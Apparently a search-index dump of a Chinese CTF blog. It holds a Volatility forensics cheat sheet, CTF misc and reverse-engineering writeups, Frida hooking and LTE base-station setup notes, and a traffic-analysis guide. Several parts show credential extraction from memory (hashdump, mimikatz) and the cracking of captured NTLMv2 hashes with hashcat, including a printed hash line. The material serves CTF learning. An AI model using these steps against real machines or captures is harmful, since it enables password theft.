查看隐藏或者解链的进程 vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pstree # 通过memdump爆破出进程对应的信息 vol.py -f OtterCTF.vmem --profile=Win7SP1x64 memdump -p 3036 --dump-dir=./ # 扫描镜像中的服务 vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 svcscan # 扫描进程缓存的文件 vol.py -f memory.raw --profile=Win7SP1x64 filescan # 查找特定后缀的文件 vol.py -f example.raw --profile=Win7SP1x64 filescan | grep -E 'txt|png|jpg|gif|zip|rar|7z|pdf|doc' # 查找指定文件夹下的文件 volatility -f example.raw --profile=Win7SP1x64 filescan | grep TMP_User # 使用dumpfiles爆破文件内容（有时可能会出现vol2提取不了但是vol3可以的情况，也可以使用 R-stdio 工具提取） vol.py -f OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 --dump-dir=./ # 查看进程环境变量 vol.py -f memory.raw --profile=Win7SP1x64 envars # 扫描进程命令行参数 vol.py -f memory.raw --profile=Win7SP1x64 cmdscan vol.py -f memory.raw --profile=Win7SP1x64 cmdline # 扫描动态库列表 # 可使用-p参数指定PID号 vol.py -f memory.img --profile=Win2003SP1x86 dlllist vol.py -f memory.img --profile=Win2003SP1x86 ldrmodules # 扫描系统中的恶意软件 vol.py -f memory.img --profile=Win2003SP1x86 malfind # 查看当前镜像中的用户 vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 printkey -K \"SAM\\Domains\\Account\\Users\\Names\" # 查看镜像中的用户名和密码(hash值) vol.py -f OtterCTF.vmem --profile=Win7SP1x64 hashdump # 使用mimikatz插件快速获取用户密码 vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.dump --profile=Win7SP1x64 mimikatz # 扫描注册表数据 # 查看注册表配置单元 vol.py -f memory.raw --profile=Win7SP1x64 hivelist # 查看注册表键值 vol.py -f OtterCTF.vmem --profile=Win7SP1x64 printkey # 查看注册表键名 vol.py -f memory.raw --profile=Win7SP1x64 hivedump -o 0xfffff8a001cce010(注册表Volatility地址) # 查看网络连接状态 vol.py -f memory.raw --profile=Win7SP1x64 connscan vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 netscan vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 connections # 查看浏览器历史记录 vol.py -f 1.vmem --profile=Win7SP1x64 iehistory # 显示有关编辑控件的信息 vol.py -f 1.vmem --profile=Win7SP1x64 editbox # 查看当前展示的notepad的内容 vol.py -f 1.vmem --profile=Win7SP1x64 notepad # 获取屏幕截图 vol.py -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./ # 导出 windows 窗口信息 vol.py -f 1.vmem --profile=Win7SP1x64 windows # 查看剪贴板信息 vol.py -f 1.vmem --profile=Win7SP1x64 clipboard # 查看剪贴板信详细内容 vol.py -f 1.vmem --profile=Win7SP1x64 clipboard -v # 查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等 vol.py -f 1.vmem --profile=Win7SP1x64 userassist # 最大程序提取信息 vol.py -f 1.vmem --profile=Win7SP1x64 timeliner # 恢复被删除的文件 vol.py -f 1.vmem --profile=Win7SP1x64 mftparser # 使用ndispktscan插件搜索内核的网络流量包信息 vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 ndispktscan # 使用usbstor插件获取USB连接信息 vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 usbstor # 使用VolDiff进行恶意软件检测 vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 voldiff # 使用bitlocker插件获取Bitlocker的加密密钥 vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 bitlocker Vol","date":"2025-08-30","objectID":"/posts/761da51/:0:0","tags":["CTF","Misc","Forensics"],"title":"Misc-数字取证","uri":"/posts/761da51/"},{"categories":["Writeup"],"content":"2025 “天一永安杯”宁波市赛初赛 Misc Writeup 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 吾的字节 啊，吾的字节！呃~我为什么要说吾？ 解压附件得到一张里面有等距像素点的二维码 five.png 扫码得到：flag is no here, see the QRcode clearly! 因此我们尝试提取其中的等距像素点，可以得到下图 然后写一个脚本将里面的黑白像素转换为1和0 from PIL import Image def func1(): img = Image.open(\"five.png\") w,h = img.size # print(w,h) res = '' for y in range(h): for x in range(w): r,g,b = img.getpixel((x,y)) if r == 0: res += '1' else: res += '0' print(res) if __name__ == \"__main__\": func1() # 001000011010000001001001100011001010010000011001001101110000000111111111001001101000000100011101100001001000010010010000101000001110000001001100100001011100001111100000010010001111011001100010011011000010000011001010010010000101000000100100001100110010000000010101001100000111000000110110000110000011100100010010000000011001000001110100101000011101101010000100000111001010110101000001111001000011000000100011001100000100110111011111111001001101101111111110011010000000111101110111100101110011111001000010111100000110101010000001001010111000001110010010100000111111000001001000110111000001110110001001001001000010100001100010100100101101001000011011100000100100000110110001001001001000010100000010010001101100100001111010001000011000101001000101100111110111000011111100001101100011111110001111011000111111101101110111011111111111100000111011101011111100110100001101100011110001111100011111000000100010 题目一直在提示五位，包括图片的名字也是five.png 因此可以联想到博多码，因此用随波逐流解密即可 当然这里就算联想不到，也可以直接用随波逐流一把梭：DASCTF{JU5T-A-F1VE6IT-9AME} 题目名称 Infinite_transformation 磁盘里蕴含着什么东西呢，也许有一只猫 压缩包注释中提示了解压密码是六位，并且还有别的用处 爆破可以得到密码是121144 解压后得到一个vmdk虚拟磁盘文件 尝试用DiskGenius恢复删除的文件 flag.txt中的内容如下： 64302039943980618121484184873128503074609076299244422107146064367058121738007282650851520841656649070683123403821937513267391370346165645908933956953599129037238861474390287394253991334205788122863003605507035424785292830536282067025856204240859500900770386319047433635878298987553848841486636769829855797015618861382395619672208366605793866695702843978585628878996390708495917362310741277717465790690657480858197797078816624813513712771929056001109014477328987890335180242509040895793315048815591172058129474723554263040 hint.txt中的内容如下： 数字映射函数 ctf.png如下所示： 用stegsolve打开，翻看发现RGB通道的第七位隐写了一张PNG图片 导出后可以得到下图 结合题面信息和之前得到的压缩包解压密码，猜测这张图片是经过猫脸变换了 然后去网上搜猫脸变换相关的脚本，发现很多脚本的a是144，b是121（出题人连这个都懒得改。。） 因此尝试解密猫脸变换，但是发现shuffle_times默认为1的时候是解不出来的 因此猜测需要爆破，这里我就直接用Github上开源的项目进行爆破了： 爆破后即可得到第一段flag 然后再回过头去看那个flag.txt 发现是由0-9的十进制数组成的一个长整数 尝试了各种解码后发现都得不到有用的信息，最后发现其实是Tupper自指公式 因此找个在线网站画个图即可得到第二段的flag：https://tuppers-formula.ovh/ 综上，结合上面两段flag即可得到最后的flag：DASCTF{ez_Arnold_TUPPER_DISK} ","date":"2025-08-17","objectID":"/posts/30d0764/:0:0","tags":["CTF","Misc","Writeup"],"title":"2025 “天一永安杯”宁波市网络安全大赛 Misc Writeup","uri":"/posts/30d0764/"},{"categories":["CTF"],"content":"未来的研究方向里有好多要用到逆向工程的地方 感觉是绕不开逆向了，因此打算猛猛突击一下 IDA使用基础 常用快捷键 快捷键 功能 F2 添加断点 F4 开始运行 F5 反编译成伪代码 F7 进入函数 F8 单步调试 F9 运行到下一个断点 Space 切换反汇编窗口(列表视图\u0026图形视图) Tab 返回栈视图 ESC 跳转到返回前的地址 / 添加注释 N 修改变量名 D 代码解析成数据 C 数据解析成代码 G 跳转到指定地址查看 H 转换为十进制数 Q 转换为十六进制数 R 转换为字符 X 查看函数的交叉引用 Y 指定当前函数的命名 Shift+F12 打开字符串窗口 Shift+E 批量复制数据为字符串或者c数组格式 正常显示中文字符串 Options → Strings → Default 8-bit 点击UTF-8然后右键新插入一个gbk，然后选中并保存 最后点击字符串，然后按键盘上的ALT+A，选中C-style即可 如果修改后中文没有正常显示，可以尝试点击反编译后的变量按F5重新反编译 例题-BUU-内涵的软件 逆向中常见的数据类型 数据类型 位数 1 byte = 8 bit 8 位 1 word = 2 byte 16 位 1 dword(Double Word) = 2 word = 4 byte 32 位 1 qword(Quadra Word) = 2 dword = 8 byte 64 位 uint32_t 32 位 uint64_t 64 位 char （-127-128） 8 位 unsigned char （0-255） 8 位 float 32位 double 64 位 汇编基础 汇编指令 示例 含义 说明 MOV MOV EAX, ECX EAX = ECX 将ECX的值赋给EAX ADD ADD EAX, ECX EAX += ECX 将EAX的值加上ECX的值 SUB SUB EAX, ECX EAX -= ECX 将EAX的值减去ECX的值 INC INC EAX EAX++ 将EAX的值+1 DEC DEX EAX EAX– 将EAX的值-1 LEA LEA EAX, ECX EAX = ECX的地址 将ECX的地址存入EAX AND AND EAX, ECX EAX = EAX \u0026 ECX EAX与ECX进行与运算 OR OR EAX, ECX EAX = EAX | ECX EAX与ECX进行或运算 XOR XOR EAX, ECX EAX = EAX ^ ECX EAX与ECX进行异或运算 NOT NOT EAX EAX = ~EAX 将EAX的值取反 SHL SHL EAX, 3 EAX = EAX « 3 将EAX的值左移三位 SHR SHR EAX, 3 EAX = EAX » 3 将EAX的值右移三位 CMP CMP EAX, ECX if(EAX == ECX) ZF = 1 else ZF = 0 对EAX和ECX的值进行比较并根据比较结果设置ZF标志的值 TEST TEST EAX, EAX if(EAX == 0) ZF = 1 else ZF = 0 将EAX的值与0进行比较并根据比较结果设置ZF标志的值 JE[JZ] JZ 04001000 if(ZF == 1) GOTO 04001000 若ZF为1则跳转至 04001000 JNE[JNZ] JNZ 04001000 if(ZF == 0) GOTO 04001000 若ZF为0则跳转至 04001000 JMP JMP 04001000 GOTO 04001000 直接跳转至 04001000 CALL CALL printf CALL $+5 调用函数printf 跳转到下一条指令 PUSH PUSH EAX 将EAX的值压入栈顶 POP POP EAX 将栈顶的值弹给EAX 一些常用的寄存器： 32位 (x86) 64位 (x64) 用途 EAX RAX 累加器（Accumulator），算术运算、函数返回值 EBX RBX 基址寄存器（Base），常用于存储指针 ECX RCX 计数器（Counter），LOOP指令、字符串操作 EDX RDX 数据寄存器（Data），辅助EAX（如MUL/DIV） ESI RSI 源索引（Source Index），字符串/内存操作 EDI RDI 目标索引（Destination Index），字符串/内存操作 ESP RSP 栈指针（Stack Pointer），指向当前栈顶 EBP RBP 基址指针（Base Pointer），函数栈帧 EIP RIP 存储下一条要执行的指令地址 EFLAGS RFLAGS 存储 CPU 状态标志（如 ZF, CF, SF 等） 常见的编码与加密 base64 char base64_table[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" int __fastcall base64_encode(char *Str2, char *Str) { int v3; // [rsp+24h] [rbp-1Ch] int v4; // [rsp+34h] [rbp-Ch] int v5; // [rsp+38h] [rbp-8h] int v6; // [rsp+3Ch] [rbp-4h] v3 = strlen(Str); if ( v3 % 3 ) v6 = 4 * (v3 / 3 + 1); else v6 = 4 * (v3 / 3); Str2[v6] = 0; v5 = 0; v4 = 0; while ( v6 - 2 \u003e v5 ) { Str2[v5] = base64_table[(unsigned __int8)Str[v4] \u003e\u003e 2]; // 右移2位，获得第一个字符前6位的数据 Str2[v5 + 1] = base64_table[(16 * (Str[v4] \u0026 3)) | ((unsigned __int8)Str[v4 + 1] \u003e\u003e 4)]; // 获取第二个6位 Str2[v5 + 2] = base64_table[(4 * (Str[v4 + 1] \u0026 0xF)) | ((unsigned __int8)Str[v4 + 2] \u003e\u003e 6)]; // 获得第三个6位 Str2[v5 + 3] = base64_table[Str[v4 + 2] \u0026 0x3F]; // 获得第四个6位 v4 += 3; v5 += 4; } if ( v3 % 3 == 1 ) { Str2[v5 - 2] = \"=\"; Str2[v5 - 1] = \"=\"; } else if ( v3 % 3 == 2 ) { Str2[v5 - 1] = \"=\"; } return putchar(\"\\n\"); } RC4加密算法 TEA系列加密算法 TEA 加密和解密的示例代码 void encrypt(unsigned int* v, unsigned int* key) { unsigned int l = v[0], r = v[1], sum = 0, delta = 0x9e3779b9; for (int i = 0; i \u003c 32; i++) { sum += delta; l += ((r \u003c\u003c 4) + key[0]) ^ (r + sum) ^ ((r \u003e\u003e 5) + key[1]); r += ((l \u003c\u003c 4) + key[2]) ^ (l + sum) ^ ((l \u003e\u003e 5) + key[3]); } v[0] = l; v[1] = r; } void decrypt(unsigned int* v, unsigned int* key) { unsigned int l = v[0], r = v[1], sum = 0, delta = 0x9e3779b9; sum = delta *32; for (int i = 0; i \u003c 32; i++) { r -= ((l \u003c\u003c 4) + key[2]) ^ (l + sum) ^ ((l \u003e\u003e 5) + key[3]); l -= ((r \u003c\u003c 4) + key[0]) ^ (r + sum) ^ ((r \u003e\u003e 5) + key[1]); sum -= delta; } v[0] = l; v[1] = r; } 解密脚本 #include\u003cstdio.h\u003e int main(){ int n;//pw的个数 unsigned int pw[]={};//可改 unsigned int v0; unsigned int v1; unsigned int sum; unsigned int key[4]={1,2,3,4};//可改 for(int i=0;i\u003cn/2;i++) { v0=pw[2*i]; v1=pw[2*i+1]; sum=-32*0x61C88647; for(int i=0;i\u003c32;i++) { v1 -= ((v0 \u003e\u003e 5) + key[3] )^ (16 * v0 + key[2]) ^ (sum + v0);//容易魔改 v0 -= ((v1 \u003e\u003e 5) + key[1]) ^ (16 * v1 + key[0]) ^ (sum + v1); sum += 0x61C88647;//容易魔改 } for (int j = 0; j\u003c=3","date":"2025-08-16","objectID":"/posts/0f92e23/:0:0","tags":["CTF","Reverse"],"title":"CTF-逆向工程","uri":"/posts/0f92e23/"},{"categories":["Research"],"content":"记录一下如何基于 srsRAN_4G 搭建 LTE 基站 本文使用的软硬件环境如下： CPU: Intel i7-14700KF (28) @ 5.500GHz USRP: B210 OS: Ubuntu 20.04.6 LTS x86_64 UHD: UHD 4.6.0.0 安装UHD 参考官方链接：https://files.ettus.com/manual/page_build_guide.html # 安装依赖 sudo apt-get install autoconf automake build-essential ccache cmake cpufrequtils doxygen ethtool \\ g++ git inetutils-tools libboost-all-dev libncurses5 libncurses5-dev libusb-1.0-0 libusb-1.0-0-dev \\ libusb-dev python3-dev python3-mako python3-numpy python3-requests python3-scipy python3-setuptools \\ python3-ruamel.yaml # 下载源码 git clone https://github.com/EttusResearch/uhd.git # 编译安装 cd uhd mkdir build cd build cmake ../ make -j$(nproc) \u0026\u0026 sudo make install # 刷新动态链接库 sudo ldconfig # 下载镜像并测试连接 sudo uhd_images_downloader sudo uhd_usrp_probe 安装srsRAN_4G # 安装依赖 sudo apt-get install libfftw3-dev libmbedtls-dev libboost-program-options-dev libconfig++-dev libsctp-dev # 下载源码 git clone https://github.com/srsRAN/srsRAN_4G.git # 编译安装 cd srsRAN_4G mkdir build cd build cmake ../ make -j$(nproc) 配置srsRAN_4G 经过测试可以正常使用的配置文件如下 如果找不到UE搜不到小区，就尝试取消注释中“修改点”的代码 epc.conf ##################################################################### # srsEPC configuration file ##################################################################### ##################################################################### # MME configuration # # mme_code: 8-bit MME code identifies the MME within a group. # mme_group: 16-bit MME group identifier. # tac: 16-bit Tracking Area Code. # mcc: Mobile Country Code # mnc: Mobile Network Code # full_net_name Display Name of the Network # short_net_name Short Display Name of the Network # apn: Set Access Point Name (APN) # mme_bind_addr: IP bind addr to listen for eNB S1-MME connnections # dns_addr: DNS server address for the UEs # encryption_algo: Preferred encryption algorithm for NAS layer # (supported: EEA0 (default), EEA1, EEA2, EEA3) # integrity_algo: Preferred integrity protection algorithm for NAS # (supported: EIA0 (rejected by most UEs), EIA1 (default), EIA2, EIA3 # paging_timer: Value of paging timer in seconds (T3413) # request_imeisv: Request UE's IMEI-SV in security mode command # lac: 16-bit Location Area Code. # ##################################################################### [mme] mme_code = 0x1a mme_group = 0x0001 tac = 0x0007 mcc = 001 mnc = 01 mme_bind_addr = 127.0.1.100 apn = srsapn dns_addr = 8.8.8.8 encryption_algo = EEA0 integrity_algo = EIA1 paging_timer = 2 request_imeisv = false lac = 0x0006 ##################################################################### # HSS configuration # # db_file: Location of .csv file that stores UEs information. # ##################################################################### [hss] db_file = ../config/user_db.csv ##################################################################### # SP-GW configuration # # gtpu_bind_addr: GTP-U bind address. # sgi_if_addr: SGi TUN interface IP address. # sgi_if_name: SGi TUN interface name. # max_paging_queue: Maximum packets in paging queue (per UE). # ##################################################################### [spgw] gtpu_bind_addr = 127.0.1.100 sgi_if_addr = 172.16.0.1 sgi_if_name = srs_spgw_sgi max_paging_queue = 100 #################################################################### # PCAP configuration # # Packets are captured to file in the compact format decoded by # the Wireshark s1ap dissector and with DLT 150. # To use the dissector, edit the preferences for DLT_USER to # add an entry with DLT=150, Payload Protocol=s1ap. # # enable: Enable or disable the PCAP. # filename: File name where to save the PCAP. # #################################################################### [pcap] enable = false filename = /tmp/epc.pcap #################################################################### # Log configuration # # Log levels can be set for individual layers. \"all_level\" sets log # level for all layers unless otherwise configured. # Format: e.g. s1ap_level = info # # In the same way, packet hex du","date":"2025-08-03","objectID":"/posts/ed6ecd5/:0:0","tags":["Research","Skills"],"title":"如何基于 srsRAN_4G 搭建 LTE 基站","uri":"/posts/ed6ecd5/"},{"categories":["Research"],"content":"最近在研究LTE和NR的空口流量分析，发现Wireshark默认是不支持解析这两种协议的 因此需要我们手动进行一些操作来支持WIreshark对LTE和NR空口流量的解析 首先需要依次点击 首选项(Preference) -\u003e 协议(Protocols) -\u003e DLT User 然后在 User DLTs Table 中添加如下内容 完成以上操作后依次点击 分析 -\u003e 启用的协议 启用 MAC-LTE 和 MAC-NR 条目下的所有协议 完成以上操作后，我们就能用Wireshark解析pcap格式的空口流量包了 参考连接： https://docs.srsran.com/projects/4g/en/latest/general/source/4_troubleshooting.html#examining-pcaps-with-wireshark ","date":"2025-07-05","objectID":"/posts/4c7a04a/:0:0","tags":["Research","Skills"],"title":"如何给Wireshark添加LTE和NR支持","uri":"/posts/4c7a04a/"},{"categories":["CTF"],"content":"一直觉得每年强网杯的谍影重重这个系列挺有意思的 因此就打算详细复盘一下历年谍影重重系列的赛题 这里手动艾特一下出题人@1cePeak，感谢冰峰师傅出的题 本文涉及的题目附件： https://pan.baidu.com/s/159nlGf_pcgCC-iePnLeqVg?pwd=uxsy 提取码: uxsy 2023 强网杯 碟影重重2.0 下载附件得到一个只有TCP流量的流量包 题目需要我们分析流量包找到飞机的飞机速度和飞机的 ICAO CODE 问了GPT得知飞机常见的协议中有ADS-B，然后在网上找到pyModeS这个模块 在 参考链接 看到了与tcp.payload中相似的数据 使用 tshark 提取出流量包中的数据，然后使用这个脚本批量解密找speed最快的即可 tshark -r attach.pcapng -T fields -e “tcp.payload” | sed ‘/^\\s*$/d’ \u003e tshark.txt import pyModeS with open(\"tshark.txt\") as f: data = f.readlines() for item in data: # print(item.strip()) if len(item.strip()) != 46: continue res = pyModeS.tell(item.strip()[18:46]) print(\"===========================================================================\") Tips：这里的 ICAO CODE 需要大写：79A05E 然后MD5加密一下即可得到：flag{4cf6729b9bc05686a79c1620b0b1967b} 2024 强网杯 谍影重重5.0 我国安全部门已经连续三年对间谍张纪星进行秘密监控，最近其网络流量突然出现大量的神秘数据，为防止其向境外传送我国机密数据，我们已将其流量保存，请你协助我们分析其传输的秘密信息。 参考文章： https://www.cnblogs.com/WTT001/p/18550311 https://blog.csdn.net/2301_79200709/article/details/143518195 https://www.haxor.no/en/article/analyzing-captured-rdp-sessions https://scofield.top/2024qwbs8_dycc5.0/ https://cn-sec.com/archives/3364589.html 题目附件给了一个pcapng流量包文件，翻看一下发现有NTLMv2的流量 并且还是走的SMB2协议，因此猜测是认证后传了什么文件 直接拿这个开源项目提取一下hash，然后尝试用hashcat爆破 经过尝试，发现第二个用户名是Tom的hash是可以爆破出来的 爆破得到密码：babygirl233，然后我们找到Wireshark首选项中的NTLMSSP 输入爆破得到的密码进行解密 加密后我们尝试导出SMB传输的文件 发现有一个压缩包，和两个证书文件 ","date":"2025-05-28","objectID":"/posts/1a152f0/:0:0","tags":["CTF","Misc"],"title":"强网杯-谍影重重系列赛题详解","uri":"/posts/1a152f0/"},{"categories":["CTF"],"content":"在学习爬虫的过程中，发现有时候需要用到Frida，因此就想着学习一下 之前经常听到队友念叨 FridaHook，现在终于有机会来学一下里面具体的内容了 系统环境配置 安卓设备：Pixel7 Pro（Rooted） 原来的版本是安卓14，但是好像安卓14在使用Frida的时候会显示Timeout 询问了队友后，发现可能是安卓版本的问题，于是把版本降低到了安卓13 Pixel的系统降级非常方便，Google官网提供了一个flash安装系统的界面，完全是傻瓜式操作 启用USB调试并安装好ADB后，直接跟着指示无脑安装及通即可 安装好系统后需要安装Magisk来获取Root权限 Root的教程可以参考这篇文章：https://zhuanlan.zhihu.com/p/647937696 这里安装Magisk的时候要注意安装新版的，要不然后面安装别的模块会显示 unzip error 新版Magisk仓库：https://github.com/topjohnwu/Magisk 配置完环境后，就可以开始学习Frida了，我这里主要参考的是Github上的Frida-Labs Frida-0x1 这里主要就是学习一下 Frida Hook 脚本的编写 脚本的基本格式如下： Java.perform(function() { var \u003cclass_reference\u003e = Java.use(\"\u003cpackage_name\u003e.\u003cclass\u003e\"); \u003cclass_reference\u003e.\u003cmethod_to_hook\u003e.implementation = function(\u003cargs\u003e) { /* OUR OWN IMPLEMENTATION OF THE METHOD */ } }) 程序的包名可以连上ADB后用frida-ps -Uai获取 jadx反编译一下apk，程序的逻辑很简单，就是比较用户的输入和随机生成的值 这里有两种Hook方式，分别是Hookget_random()和check()两个函数 Java.perform(function() { var a = Java.use(\"com.ad2001.frida0x1.MainActivity\"); a.get_random.implementation = function(){ console.log(\"This method is hooked\"); var ret_val = this.get_random(); console.log(\"The return value is \" + ret_val); console.log(\"The value to bypass the check \" + (ret_val * 2 + 4 )) // To bypass the check return ret_val; //returning the original random value from the get_random method } }) Java.perform(function(){ var a = Java.use(\"com.ad2001.frida0x1.MainActivity\"); a.check.overload('int','int').implementation = function(a,b){// 注意参数的传递 console.log(\"The random num is \" + a); console.log(\"The num user input is \" + b); this.check(4,12); } }) ","date":"2025-05-17","objectID":"/posts/ca974cb/:0:0","tags":["CTF"],"title":"Frida Learning Record","uri":"/posts/ca974cb/"},{"categories":["CTF"],"content":"CTF-Misc 入门指南——流量分析系列 拿到流量包后，第一件事就是可以先 strings | grep flag{ 一下，说不定 flag 就直接出了 当然也可以使用@凤二西师傅的 破空_flag查找工具3.5.exe 来搜索 flag WireShark基础 刚刚接触流量分析的同学，看到Wireshark中密密麻麻的流量包和字段可能会感觉无从下手 但是其实我们要明白一点就是，流量分析的第一步就是过滤，把流量包过滤到我们能掌控的范围内，然后再逐个分析 wireshark的过滤器其实上手很简单，用熟悉了以后会给人一种非常顺手的感觉 常见的协议比如http，常用的有下面这些参数，其实只要在过滤器中输入htt. 它就会自动提示你后面的字段了 http.request.method == \"POST\" http.request.full_uri == “XXX” ...... 除了协议以外，还有一些比较常用的 # 包含什么内容的帧 frame contains \"XXX\" 其实这里可以直接右击想要过滤的字段，然后作为过滤器选中，上面就会自己跳出来过滤的表达式了（这里也可以使用或选中和且选中） 有了这个表达式，就可以带入下面的 tshark 命令一键提取所有过滤出来的帧的指定字段的数据了 tshark使用教程 导出流量包中所有POST数据包的data数据 tshark -r 1.pcapng -Y \"http.request.method == POST\" -T fields -e data.data \u003e data.txt # -r：指定了需要读取的文件 # -Y：使用过滤器 # -T：表示仅仅输出所选字段 # -e：指定提取的字段 以下两个命令是Linux中的命令 # uinq：去除重复行 # sed '/^\\s*$/d'：在sed中使用正则表达式过滤掉所有空行（其中 ^\\s*$ 匹配空行，d 表示删除） 在我们清楚了tshark的相关命令后，我们就可以尝试编写Python脚本来调用tshark进行流量包的处理了 这种用法通常在我们分析较大流量包并且需要频繁复制里面的数据的时候比较实用 import json import subprocess output = \"\" file_path = \"\" # 流量包的路径 command = [ \"tshark\", # tshark的路径，如果在环境变量里这里就不用改 '-r', file_path, # 读取指定的 pcapng 文件 '-Y', 'http', # 过滤出 HTTP 数据包 '-T', 'json', # 输出为 JSON 格式 '-e', 'http.request.method', # 请求方法 '-e', 'http.host', # 请求主机 '-e', 'http.request.uri', # 请求 URI '-e', 'http.user_agent', # 用户代理 '-e', 'http.file_data', # 请求中的文件数据（POST 请求的内容） '-e', 'http.response.code', # 响应代码 '-e', 'http.response.phrase', # 响应短语 '-e', 'http.content_type' # 响应内容类型 ] result = subprocess.run( command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) json_output = json.loads(result.stdout) # print(json.dumps(json_output, indent=4)) # 这个输出是用来调试的，可以移除 # 遍历 JSON 数据并提取字段 for packet in json_output: layers = packet.get('_source', {}).get('layers', {}) request_method = layers.get('http.request.method', ['None'])[0] request_host = layers.get('http.host', ['None'])[0] request_uri = layers.get('http.request.uri', ['None'])[0] user_agent = layers.get('http.user_agent', ['None'])[0] file_data = layers.get('http.file_data', ['None'])[0] response_code = layers.get('http.response.code', ['None'])[0] response_phrase = layers.get('http.response.phrase', ['None'])[0] content_type = layers.get('http.content_type', ['None'])[0] 流量分析基础考点 1、直接搜索flag明文或者编码过的flag: 2、流量包端口隐写（可能会有01互换） 3、TCP/FTP协议传输文件(binwalk和foremost都没用)： 1. 直接用wireshark导出为pcap文件然后用networkminer分析 2. 拉入kali用tcpxtract提取文件：tcpxtract -f +文件名.pcap 3. 直接追踪流提取16进制，根据文件头尾提取出文件 4、有时候可能需要根据IP或者版本分类导出 USB流量分析 常见的类型有鼠标流量和键盘流量，当然有时候还会出现数位板这种设备的流量 流量包中数据存储的字段有两种：usb.capdata 和 usbhid.data 键盘流量分析 键盘流量的数据常见的长度为8字节 首先根据数据存储的字段，用tshark提取出数据，注意在有多个IP的情况下要用过滤器分IP提取 tshark -r example.pcapng -T fields -e usb.capdata | sed '/^\\s*$/d' \u003e data.txt tshark -r example.pcapng -T fields -e usbhid.data | sed '/^\\s*$/d' \u003e data.txt tshark -r example.pcapng -Y 'usb.src == \"2.3.1\"' -T fields -e usbhid.data | sed '/^\\s*$/d' \u003e data.txt # -r：指定了需要读取的文件 # -Y：使用过滤器 # -T：表示仅仅输出所选字段 # -e：指定提取的字段 # sed '/^\\s*$/d'：在sed中使用正则表达式过滤掉所有空行（其中 ^\\s*$ 匹配空行，d 表示删除） 然后使用脚本根据对照表还原出键盘输入的数据即可 Tips:网上的教程都是告诉大家需要对数据先添加冒号，但是现在新版的tshark很多情况下提取出来的数据是不带冒号的 因此我个人觉得这里没必要多此一举，我们还是要与时俱进，简单改一下网上的脚本就行 这里就贴一份的自己写的还原脚本吧 normalKeys = {\"04\": \"a\", \"05\": \"b\", \"06\": \"c\", \"07\": \"d\", \"08\": \"e\", \"09\": \"f\", \"0a\": \"g\", \"0b\": \"h\", \"0c\": \"i\", \"0d\": \"j\", \"0e\": \"k\", \"0f\": \"l\", \"10\": \"m\", \"11\": \"n\", \"12\": \"o\", \"13\": \"p\", \"14\": \"q\", \"15\": \"r\", \"16\": \"s\", \"17\": \"t\", \"18\": \"u\", \"19\": \"v\", \"1a\": \"w\", \"1b\": \"x\", \"1c\": \"y\", \"1d\": \"z\", \"1e\": \"1\", \"1f\": \"2\", \"20\": \"3\", \"21\": \"4\", \"22\": \"5\", \"23\": \"6\", \"24\": \"7\", \"25\": \"8\", \"26\": \"9\", \"27\": \"0\", \"28\": \"\u003cRET\u003e\", \"29\": \"\u003cESC\u003e\", \"2a\": \"\u003cDEL\u003e\", \"2b\": \"\\t\", \"2c\": \"\u003cSPACE\u003e\", \"2d\": \"-\", \"2e\": \"=\", \"2f\": \"[\", \"30\": \"]\", \"31\": \"\\\\\", \"32\": \"\u003cNON\u003e\", \"33\": \";\", \"34\": \"'\", \"35\": \"\u003cGA\u003e\", \"36\": \",\", \"37\": \".\", \"38\": \"/\", \"39\": \"\u003cCAP\u003e\", \"3a\": \"\u003cF1\u003e\", \"3b\": \"\u003cF2\u003e\", \"3c\": \"\u003cF3\u003e\", \"3d\": \"\u003cF4\u003e\", \"3e\": \"\u003cF5\u003e\", \"3f\": \"\u003cF6\u003e\", \"40\": \"\u003cF7\u003e\", \"41\": \"\u003cF8\u003e\", \"42\": \"\u003cF9\u003e\", \"43\": \"\u003cF10\u003e\", \"44\": \"\u003cF11\u003e\", \"45\": \"\u003cF12\u003e\"} shiftKeys = {\"04\": \"A\", \"05\": \"B\", \"06\": \"C\", \"07\": \"D\", \"08\": \"E\", \"09\": \"F\",\"0a\": \"G\", \"0b\": \"H\", \"0c\": \"I\", \"0d\":","date":"2025-05-15","objectID":"/posts/5422d65/:0:0","tags":["CTF","Misc"],"title":"Misc-流量分析","uri":"/posts/5422d65/"},{"categories":["Writeup"],"content":"有师傅来问这场比赛里的题，然后稍微看了一下，发现Misc题确实出的挺好，于是打算记录一下 题目附件：https://buuoj.cn/match/matches/213 题目名称 弹道偏下 解压附件压缩包，得到一个secret.pcapng 翻看流量，发现主要是加密的SMB2流量，用了NTLM身份验证机制 因此我们尝试手动把验证过程中的数据提取出来，然后用hashcat爆破 具体原理和提取步骤详见作者的这篇博客：Misc-Network Traffic Analysis share::MicrosoftAccount:0a08d9f15eb53eea:a20aec951c89961f2e81bf0917d8990a:0101000000000000cfebd19d3636db01022ada3cfbb5b30e0000000002001e004400450053004b0054004f0050002d004800440039004b0051004e00540001001e004400450053004b0054004f0050002d004800440039004b0051004e00540004001e004400450053004b0054004f0050002d004800440039004b0051004e00540003001e004400450053004b0054004f0050002d004800440039004b0051004e00540007000800cfebd19d3636db01060004000200000008003000300000000000000001000000002000004c3c615542417f8e002c772c6064cc84d886fec17c1ed7cceea68daf7f6954fc0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100340039002e003100350035000000000000000000 .\\hashcat.exe -m 5600 -a 0 hash.txt rockyou.txt --force 